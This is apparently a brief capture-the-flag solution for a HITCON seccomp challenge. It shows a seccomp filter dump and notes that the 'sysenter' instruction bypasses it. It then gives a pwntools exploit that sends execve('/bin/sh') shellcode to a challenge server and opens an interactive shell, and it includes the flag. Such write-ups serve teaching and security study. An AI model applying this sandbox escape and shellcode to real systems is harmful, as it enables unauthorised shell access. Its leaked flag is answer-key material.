# 32 world
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer >> 32
 0001: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```
* Use `sysenter` to bypass the constraint.
```python
#!/usr/bin/env python
from pwn import *

# hitcon{s3cc0mp_1s_n0t_4lw4y_s4f3_LOL}

host , port = '54.65.133.244' , 8361
y = remote( host , port )

p = asm('''
	push 0x68732f
	push 0x6e69622f
	mov ebx, esp
	mov al, 0xb
	mov ebp, esp
	sysenter
''')

y.sendafter( ':' , p )
y.interactive()
```